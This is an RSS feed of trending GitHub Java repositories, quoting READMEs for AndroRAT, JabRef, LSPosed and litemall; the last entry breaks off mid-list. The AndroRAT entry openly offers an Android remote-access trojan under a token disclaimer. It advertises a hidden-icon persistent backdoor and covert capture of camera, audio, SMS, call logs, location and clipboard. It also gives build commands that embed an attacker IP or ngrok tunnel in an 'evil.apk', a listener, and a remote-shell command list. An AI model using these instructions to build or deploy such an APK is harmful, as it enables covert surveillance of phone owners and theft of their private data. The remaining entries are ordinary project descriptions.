<rss version="2.0">
  <channel>
    <title>GitHub Java Daily Trending</title>
    <description>Daily Trending of Java in GitHub</description>
    <pubDate>Tue, 16 Sep 2025 01:33:17 GMT</pubDate>
    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
    
    <item>
      <title>karma9874/AndroRAT</title>
      <link>https://github.com/karma9874/AndroRAT</link>
      <description>&lt;p&gt;A Simple android remote administration tool using sockets. It uses java on the client side and python on the server side&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt; : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.&lt;/p&gt; 
&lt;h1&gt;AndroRAT&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://opensource.org/licenses/MIT"&gt;&lt;img src="https://img.shields.io/badge/license-MIT-blue.svg?sanitize=true" alt="MIT License" /&gt;&lt;/a&gt; &lt;a href="https://twitter.com/karma9874"&gt;&lt;img src="https://img.shields.io/twitter/follow/karma9874?label=Follow&amp;amp;style=social" alt="Twitter Follow" /&gt;&lt;/a&gt; &lt;a href="https://github.com/karma9874"&gt;&lt;img src="https://img.shields.io/github/followers/karma9874?label=Follow&amp;amp;style=social" alt="GitHub followers" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.&lt;/p&gt; 
&lt;h5&gt;AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)&lt;/h5&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Screenshots&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/karma9874/AndroRAT/master/Screenshots/5.jpg" alt="AndroRAT" title="AndroRAT in action" /&gt;&lt;/p&gt; 
&lt;h2&gt;Features of AndroRAT&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Full persistent backdoor&lt;/li&gt; 
 &lt;li&gt;&lt;del&gt;Fully undetectable by any antivirus scanner &lt;a href="https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection"&gt;VirusTotal&lt;/a&gt;&lt;/del&gt;&lt;/li&gt; 
 &lt;li&gt;Invisible icon on install&lt;/li&gt; 
 &lt;li&gt;Light weight apk which runs 24*7 in background&lt;/li&gt; 
 &lt;li&gt;App starts automatically on boot up&lt;/li&gt; 
 &lt;li&gt;Can record audio, video, take picture from both camera&lt;/li&gt; 
 &lt;li&gt;Browse call logs and SMS logs&lt;/li&gt; 
 &lt;li&gt;Get current location, sim card details ,ip, mac address of the device&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Prerequisites&lt;/h2&gt; 
&lt;p&gt;AndroRAT requires Python3 and JAVA (or Android Studio)&lt;/p&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;git clone https://github.com/karma9874/AndroRAT.git
cd AndroRAT
pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Note:&lt;/h4&gt; 
&lt;p&gt;While cloning the repository using Git bash on Windows, you may get the following error:&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;error: unable to create file &amp;lt;filename&amp;gt;: Filename too long&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;This is because the Git has a limit of 4096 characters for a filename, except on Windows when Git is compiled with msys. It uses an older version of the Windows API and there's a limit of 260 characters for a filename.&lt;/p&gt; 
&lt;p&gt;You can circumvent this by setting &lt;code&gt;core.longpaths&lt;/code&gt; to &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;git config --system core.longpaths true&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;You must run Git bash with administrator privileges.&lt;/p&gt; 
&lt;h2&gt;Usage (Windows and Linux)&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;To get the control panel of the app dial &lt;code&gt;*#*#1337#*#*&lt;/code&gt; (For now it has only two options &lt;code&gt;Restart Activity&lt;/code&gt; and &lt;code&gt;Uninstall&lt;/code&gt;)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Note: In order to use this feature in some devices you need to enable the option &lt;code&gt;display pop-up windows running in background&lt;/code&gt; from the settings.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Available Modes&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;--build&lt;/code&gt; - for building the android apk&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--ngrok&lt;/code&gt; - for using ngrok tunnel (over the internet)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--shell&lt;/code&gt; - getting an interactive shell of the device&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;&lt;code&gt;build&lt;/code&gt; mode&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;Usage:
  python3 androRAT.py --build --ngrok [flags]
  Flags:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -o, --output            Name for the apk file (optional by default its set to "karma.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;&lt;code&gt;Usage:
  python3 androRAT.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Or you can manually build the apk by importing &lt;a href="https://raw.githubusercontent.com/karma9874/AndroRAT/master/Android_Code"&gt;Android Code&lt;/a&gt; folder to Android Studio and changing the IP address and port number in &lt;a href="https://raw.githubusercontent.com/karma9874/AndroRAT/master/Android_Code/app/src/main/java/com/example/reverseshell2/config.java"&gt;config.java&lt;/a&gt; file and then you can generate the signed apk from &lt;code&gt;Android Studio -&amp;gt; Build -&amp;gt; Generate Signed APK(s)&lt;/code&gt;&lt;/p&gt; 
&lt;h3&gt;&lt;code&gt;shell&lt;/code&gt; mode&lt;/h3&gt; 
&lt;pre&gt;&lt;code&gt;Usage:
  python3 androRAT.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After running the &lt;code&gt;shell&lt;/code&gt; mode you will get an interpreter of the device&lt;/p&gt; 
&lt;p&gt;Commands which can run on the interpreter&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;    deviceInfo                 --&amp;gt; returns basic info of the device
    camList                    --&amp;gt; returns cameraID  
    takepic [cameraID]         --&amp;gt; Takes picture from camera
    startVideo [cameraID]      --&amp;gt; starts recording the video
    stopVideo                  --&amp;gt; stop recording the video and return the video file
    startAudio                 --&amp;gt; starts recording the audio
    stopAudio                  --&amp;gt; stop recording the audio
    getSMS [inbox|sent]        --&amp;gt; returns inbox sms or sent sms in a file 
    getCallLogs                --&amp;gt; returns call logs in a file
    shell                      --&amp;gt; starts a sh shell of the device
    vibrate [number_of_times]  --&amp;gt; vibrate the device number of time
    getLocation                --&amp;gt; return the current location of the device
    getIP                      --&amp;gt; returns the ip of the device
    getSimDetails              --&amp;gt; returns the details of all sim of the device
    clear                      --&amp;gt; clears the screen
    getClipData                --&amp;gt; return the current saved text from the clipboard
    getMACAddress              --&amp;gt; returns the mac address of the device
    exit                       --&amp;gt; exit the interpreter
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;In the sh shell there are some sub commands&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;    get [full_file_path]        --&amp;gt; donwloads the file to the local machine (file size upto 15mb)
    put [filename]              --&amp;gt; uploads the file to the android device
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Examples&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;To build the apk using ngrok which will also set the listner: &lt;code&gt;python3 androRAT.py --build --ngrok -o evil.apk&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;To build the apk using desired ip and port: &lt;code&gt;python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;To get the interpreter: &lt;code&gt;python3 androRAT.py --shell -i 0.0.0.0 -p 8000&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Interpreter Examples&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Generating APK&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/karma9874/AndroRAT/master/Screenshots/6.JPG" width="800" /&gt; &lt;/p&gt; ------------------------------------------------------------------------------------------------------------------------------ 
&lt;ul&gt; 
 &lt;li&gt;Some interpreter Commands&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/karma9874/AndroRAT/master/Screenshots/1.JPG" width="800" /&gt; &lt;/p&gt; ------------------------------------------------------------------------------------------------------------------------------ 
&lt;h2&gt;Supporters:&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://github.com/rayep"&gt;&lt;img src="https://avatars.githubusercontent.com/u/40718616?v=4&amp;amp;s=60" alt="rayep" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;TODO&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;del&gt;Ngrok support&lt;/del&gt;&lt;/li&gt; 
 &lt;li&gt;Set up multi client&lt;/li&gt; 
 &lt;li&gt;Add screenshot command&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;AndroRAT is licensed under MIT license take a look at the &lt;a href="https://raw.githubusercontent.com/karma9874/AndroRAT/master/LICENSE"&gt;LICENSE&lt;/a&gt; for more information.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>JabRef/jabref</title>
      <link>https://github.com/JabRef/jabref</link>
      <description>&lt;p&gt;Graphical Java application for managing BibTeX and BibLaTeX (.bib) databases&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;JabRef Bibliography Management &lt;a href="https://apidia.net/java/JabRef/main"&gt;&lt;img src="https://apidia.net/java/JabRef/main/badge.svg?sanitize=true" alt="APIdia" /&gt;&lt;/a&gt;&lt;/h1&gt; 
&lt;p&gt;JabRef is an open-source, cross-platform citation and reference management tool.&lt;/p&gt; 
&lt;p&gt;Stay on top of your literature: JabRef helps you to collect and organize sources, find the paper you need and discover the latest research.&lt;/p&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/JabRef/jabref/main/docs/images/jabref-mainscreen.png" alt="main table" /&gt;&lt;/p&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;p&gt;JabRef is available free of charge and is actively developed. It supports you in every step of your research work.&lt;/p&gt; 
&lt;h3&gt;Collect&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Search across many online scientific catalogues like CiteSeer, CrossRef, Google Scholar, IEEEXplore, INSPIRE-HEP, Medline PubMed, MathSciNet, Springer, arXiv, and zbMATH&lt;/li&gt; 
 &lt;li&gt;Import options for over 15 reference formats&lt;/li&gt; 
 &lt;li&gt;Easily retrieve and link full-text articles&lt;/li&gt; 
 &lt;li&gt;Fetch complete bibliographic information based on ISBN, DOI, PubMed-ID and arXiv-ID&lt;/li&gt; 
 &lt;li&gt;Extract metadata from PDFs&lt;/li&gt; 
 &lt;li&gt;Import new references directly from the browser with one click using the &lt;a href="https://github.com/JabRef/JabRef-Browser-Extension"&gt;official browser extension&lt;/a&gt; for &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/jabref/?src=external-github"&gt;Firefox&lt;/a&gt;, &lt;a href="https://chrome.google.com/webstore/detail/jabref-browser-extension/bifehkofibaamoeaopjglfkddgkijdlh"&gt;Chrome&lt;/a&gt;, &lt;a href="https://microsoftedge.microsoft.com/addons/detail/pgkajmkfgbehiomipedjhoddkejohfna"&gt;Edge&lt;/a&gt;, and &lt;a href="https://chrome.google.com/webstore/detail/jabref-browser-extension/bifehkofibaamoeaopjglfkddgkijdlh"&gt;Vivaldi&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Organize&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Group your research into hierarchical collections and organize research items based on keywords/tags, search terms, or your manual assignments&lt;/li&gt; 
 &lt;li&gt;Advanced search and filter features&lt;/li&gt; 
 &lt;li&gt;Complete and fix bibliographic data by comparing with curated online catalogs such as Google Scholar, Springer, or MathSciNet&lt;/li&gt; 
 &lt;li&gt;Customizable citation key generator&lt;/li&gt; 
 &lt;li&gt;Customize and add new metadata fields or reference types&lt;/li&gt; 
 &lt;li&gt;Find and merge duplicates&lt;/li&gt; 
 &lt;li&gt;Attach related documents: 20 different kinds of documents supported out of the box, completely customizable and extendable&lt;/li&gt; 
 &lt;li&gt;Automatically rename and move associated documents according to customizable rules&lt;/li&gt; 
 &lt;li&gt;Keep track of what you read: ranking, priority, printed, quality-assured&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Cite&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Native BibTeX and BibLaTeX support&lt;/li&gt; 
 &lt;li&gt;Cite-as-you-write functionality for external applications such as Emacs, Kile, LyX, Texmaker, TeXstudio, Vim and WinEdt.&lt;/li&gt; 
 &lt;li&gt;Format references using one of thousands of built-in citation styles or create your own style&lt;/li&gt; 
 &lt;li&gt;Support for Word and LibreOffice/OpenOffice for inserting and formatting citations&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Share&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Many built-in export options or create your export format&lt;/li&gt; 
 &lt;li&gt;Library is saved as a simple text file, and thus it is easy to share with others via Dropbox and is version-control friendly&lt;/li&gt; 
 &lt;li&gt;Work in a team: sync the contents of your library via a SQL database&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;Fresh development builds are available at &lt;a href="https://builds.jabref.org/main/"&gt;builds.jabref.org&lt;/a&gt;. The &lt;a href="https://downloads.jabref.org/"&gt;latest stable release is available at FossHub&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Please see our &lt;a href="https://docs.jabref.org/installation"&gt;Installation Guide&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;JabKit&lt;/h2&gt; 
&lt;p&gt;JabRef offers a CLI application.&lt;/p&gt; 
&lt;p&gt;You can run it using JBang. We provide details at &lt;a href="https://raw.githubusercontent.com/JabRef/jabref/main/.jbang/README.md"&gt;&lt;code&gt;.jbang/README.md&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;You can also run JabKit using docker:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-terminal"&gt;docker run ghcr.io/jabref/jabkit:edge --help
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Bug Reports, Suggestions, Other Feedback&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://donations.jabref.org"&gt;&lt;img src="https://img.shields.io/badge/donate%20to-jabref-orange.svg?sanitize=true" alt="Donation" /&gt;&lt;/a&gt; &lt;a href="https://paypal.me/JabRef"&gt;&lt;img src="https://img.shields.io/badge/donate-paypal-00457c.svg?logo=paypal&amp;amp;style=flat-square" alt="PayPal Donate" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;We are thankful for any bug reports or other feedback. If you have ideas for new features you want to be included in JabRef, tell us in &lt;a href="http://discourse.jabref.org/c/features"&gt;the feature section&lt;/a&gt; of our forum! If you need support in using JabRef, please read the &lt;a href="https://docs.jabref.org/"&gt;user documentation&lt;/a&gt;, especially the &lt;a href="https://docs.jabref.org/faq"&gt;frequently asked questions (FAQ)&lt;/a&gt; and also take a look at our &lt;a href="https://discourse.jabref.org/c/help/7"&gt;community forum&lt;/a&gt;. You can use our &lt;a href="https://github.com/JabRef/jabref/issues"&gt;GitHub issue tracker&lt;/a&gt; to file bug reports.&lt;/p&gt; 
&lt;p&gt;An explanation of donation possibilities and usage of donations is available at our &lt;a href="https://donations.jabref.org"&gt;donations page&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;Want to be part of a free and open-source project that tens of thousands of researchers use every day? Please take a look at our &lt;a href="https://raw.githubusercontent.com/JabRef/jabref/main/CONTRIBUTING.md"&gt;guidelines for contributing&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Building from Source&lt;/h2&gt; 
&lt;p&gt;Please see &lt;a href="https://docs.jabref.org/installation#building-from-source"&gt;Building from source&lt;/a&gt; for instructions on how to build JabRef from sources.&lt;/p&gt; 
&lt;h2&gt;Research and Education&lt;/h2&gt; 
&lt;p&gt;JabRef welcomes research applied to it. The current list of papers where JabRef helped to enhance science is maintained at &lt;a href="https://github.com/JabRef/jabref/wiki/JabRef-in-the-Media"&gt;https://github.com/JabRef/jabref/wiki/JabRef-in-the-Media&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The JabRef team also fosters to use JabRef in Software Engineering training. We offer guidelines for this at &lt;a href="https://devdocs.jabref.org/teaching.html"&gt;https://devdocs.jabref.org/teaching.html&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When citing JabRef, please use the following citation:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@Article{jabref,
  author  = {Oliver Kopp and Carl Christian Snethlage and Christoph Schwentker},
  title   = {JabRef: BibTeX-based literature management software},
  journal = {TUGboat},
  volume  = {44},
  number  = {3},
  pages   = {441--447},
  doi     = {10.47397/tb/44-3/tb138kopp-jabref},
  issn    = {0896-3207},
  issue   = {138},
  year    = {2023},
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;DOI (also includes &lt;a href="https://tug.org/TUGboat/tb44-3/tb138kopp-jabref.pdf"&gt;full text&lt;/a&gt;): &lt;a href="https://doi.org/10.47397/tb/44-3/tb138kopp-jabref"&gt;10.47397/tb/44-3/tb138kopp-jabref&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Sponsoring&lt;/h2&gt; 
&lt;p&gt;JabRef development is powered by YourKit Java Profiler&lt;br /&gt; &lt;a href="https://www.yourkit.com/java/profiler/"&gt;&lt;img src="https://www.yourkit.com/images/yk_logo.svg?sanitize=true" alt="YourKit Java Profiler" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;ProductMap File Analysis Result&lt;/h2&gt; 
&lt;p&gt;This section contains an analysis of ProductMap files. Each file has a link to its source.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Github File&lt;/th&gt; 
   &lt;th&gt;ProductMap File URL&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;a href="https://github.com/JabRef/jabref/raw/main/src/main/java/org/jabref/gui/maintable/MainTableTooltip.java"&gt;src/main/java/org/jabref/gui/maintable/MainTableTooltip.java&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://product-map.ai/app/public?url=https://github.com/JabRef/jabref/raw/main/src/main/java/org/jabref/gui/maintable/MainTableTooltip.java"&gt;View File&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;ProductMap - Contact Us&lt;/h3&gt; 
&lt;p&gt;For any inquiries, feel free to &lt;a href="https://product-map.ai"&gt;contact ProductMap.ai&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>LSPosed/LSPosed</title>
      <link>https://github.com/LSPosed/LSPosed</link>
      <description>&lt;p&gt;LSPosed Framework&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;LSPosed Framework&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/LSPosed/LSPosed/actions/workflows/core.yml?query=event%3Apush+branch%3Amaster+is%3Acompleted"&gt;&lt;img src="https://img.shields.io/github/actions/workflow/status/LSPosed/LSPosed/core.yml?branch=master&amp;amp;event=push&amp;amp;logo=github&amp;amp;label=Build" alt="Build" /&gt;&lt;/a&gt; &lt;a href="https://lsposed.crowdin.com/lsposed"&gt;&lt;img src="https://img.shields.io/badge/Localization-Crowdin-blueviolet?logo=Crowdin" alt="Crowdin" /&gt;&lt;/a&gt; &lt;a href="https://t.me/LSPosed"&gt;&lt;img src="https://img.shields.io/badge/Follow-Telegram-blue.svg?logo=telegram" alt="Channel" /&gt;&lt;/a&gt; &lt;a href="https://qun.qq.com/qqweb/qunpro/share?_wv=3&amp;amp;_wwv=128&amp;amp;inviteCode=Xz9dJ&amp;amp;from=246610&amp;amp;biz=ka"&gt;&lt;img src="https://img.shields.io/badge/Join-QQ%E9%A2%91%E9%81%93-red?logo=tencent-qq&amp;amp;logoColor=red" alt="Chat" /&gt;&lt;/a&gt; &lt;a href="https://github.com/LSPosed/LSPosed/releases/latest"&gt;&lt;img src="https://img.shields.io/github/v/release/LSPosed/LSPosed?color=orange&amp;amp;logoColor=orange&amp;amp;label=Download&amp;amp;logo=DocuSign" alt="Download" /&gt;&lt;/a&gt; &lt;a href="https://github.com/LSPosed/LSPosed/releases"&gt;&lt;img src="https://shields.io/github/downloads/LSPosed/LSPosed/total?logo=Bookmeter&amp;amp;label=Counts&amp;amp;logoColor=yellow&amp;amp;color=yellow" alt="Total" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Introduction&lt;/h2&gt; 
&lt;p&gt;A Riru / Zygisk module trying to provide an ART hooking framework which delivers consistent APIs with the OG Xposed, leveraging LSPlant hooking framework.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Xposed is a framework for modules that can change the behavior of the system and apps without touching any APKs. That's great because it means that modules can work for different versions and even ROMs without any changes (as long as the original code was not changed too much). It's also easy to undo. As all changes are done in the memory, you just need to deactivate the module and reboot to get your original system back. There are many other advantages, but here is just one more: multiple modules can do changes to the same part of the system or app. With modified APKs, you have to choose one. No way to combine them, unless the author builds multiple APKs with different combinations.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Supported Versions&lt;/h2&gt; 
&lt;p&gt;Android 8.1 ~ 14&lt;/p&gt; 
&lt;h2&gt;Install&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;Install Magisk v24+&lt;/li&gt; 
 &lt;li&gt;(For Riru flavor) Install &lt;a href="https://github.com/RikkaApps/Riru/releases/latest"&gt;Riru&lt;/a&gt; v26.1.7+&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/LSPosed/LSPosed/master/#download"&gt;Download&lt;/a&gt; and install LSPosed in Magisk app&lt;/li&gt; 
 &lt;li&gt;Reboot&lt;/li&gt; 
 &lt;li&gt;Open LSPosed manager from notification&lt;/li&gt; 
 &lt;li&gt;Have fun :)&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Download&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;For stable releases, please go to &lt;a href="https://github.com/LSPosed/LSPosed/releases"&gt;Github Releases page&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;For canary build, please check &lt;a href="https://github.com/LSPosed/LSPosed/actions/workflows/core.yml?query=branch%3Amaster"&gt;Github Actions&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Note: debug builds are only available in Github Actions.&lt;/p&gt; 
&lt;h2&gt;Get Help&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Only bug reports from &lt;strong&gt;THE LATEST DEBUG BUILD&lt;/strong&gt; will be accepted.&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;GitHub issues: &lt;a href="https://github.com/LSPosed/LSPosed/issues/"&gt;Issues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;(For Chinese speakers) 本项目只接受英语&lt;strong&gt;标题&lt;/strong&gt;的issue。如果您不懂英语，请使用&lt;a href="https://www.deepl.com/zh/translator"&gt;翻译工具&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;For Developers&lt;/h2&gt; 
&lt;p&gt;Developers are welcome to write Xposed modules with hooks based on LSPosed Framework. A module based on LSPosed framework is fully compatible with the original Xposed Framework, and vice versa, a Xposed Framework-based module will work well with LSPosed framework too.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://api.xposed.info/"&gt;Xposed Framework API&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;We use our own module repository. We welcome developers to submit modules to our repository, and then modules can be downloaded in LSPosed.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/Xposed-Modules-Repo"&gt;LSPosed Module Repository&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Community Discussion&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Telegram: &lt;a href="https://t.me/s/LSPosed"&gt;@LSPosed&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Notice: These community groups don't accept any bug report, please use &lt;a href="https://raw.githubusercontent.com/LSPosed/LSPosed/master/#get-help"&gt;Get help&lt;/a&gt; to report.&lt;/p&gt; 
&lt;h2&gt;Translation Contributing&lt;/h2&gt; 
&lt;p&gt;You can contribute translation &lt;a href="https://lsposed.crowdin.com/lsposed"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Credits&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/topjohnwu/Magisk/"&gt;Magisk&lt;/a&gt;: makes all these possible&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/RikkaApps/Riru"&gt;Riru&lt;/a&gt;: provides a way to inject code into zygote process&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/rovo89/XposedBridge"&gt;XposedBridge&lt;/a&gt;: the OG Xposed framework APIs&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/jmpews/Dobby"&gt;Dobby&lt;/a&gt;: used for inline hooking&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/LSPosed/LSPlant"&gt;LSPlant&lt;/a&gt;: the core ART hooking framework&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/ElderDrivers/EdXposed"&gt;EdXposed&lt;/a&gt;: fork source&lt;/li&gt; 
 &lt;li&gt;&lt;del&gt;&lt;a href="https://github.com/ganyao114/SandHook/"&gt;SandHook&lt;/a&gt;: ART hooking framework for SandHook variant&lt;/del&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;del&gt;&lt;a href="https://github.com/rk700/YAHFA"&gt;YAHFA&lt;/a&gt;: previous ART hooking framework&lt;/del&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;del&gt;&lt;a href="https://github.com/linkedin/dexmaker"&gt;dexmaker&lt;/a&gt; and &lt;a href="https://github.com/JakeWharton/dalvik-dx"&gt;dalvikdx&lt;/a&gt;: to dynamically generate YAHFA hooker classes&lt;/del&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;del&gt;&lt;a href="https://github.com/LSPosed/DexBuilder"&gt;DexBuilder&lt;/a&gt;: to dynamically generate YAHFA hooker classes&lt;/del&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;LSPosed is licensed under the &lt;strong&gt;GNU General Public License v3 (GPL-3)&lt;/strong&gt; (&lt;a href="http://www.gnu.org/copyleft/gpl.html"&gt;http://www.gnu.org/copyleft/gpl.html&lt;/a&gt;).&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>linlinjava/litemall</title>
      <link>https://github.com/linlinjava/litemall</link>
      <description>&lt;p&gt;又一个小商城。litemall = Spring Boot后端 + Vue管理员前端 + 微信小程序用户前端 + Vue用户移动端&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;litemall&lt;/h1&gt; 
&lt;p&gt;又一个小商场系统。&lt;/p&gt; 
&lt;p&gt;litemall = Spring Boot后端 + Vue管理员前端 + 微信小程序用户前端 + Vue用户移动端&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://linlinjava.gitbook.io/litemall"&gt;文档&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://linlinjava.gitbook.io/litemall/contribute"&gt;贡献&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://linlinjava.gitbook.io/litemall/faq"&gt;FAQ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://linlinjava.gitbook.io/litemall/api"&gt;API&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;项目代码&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://gitee.com/linlinjava/litemall"&gt;码云&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/linlinjava/litemall"&gt;GitHub&lt;/a&gt;&lt;/li&gt; 
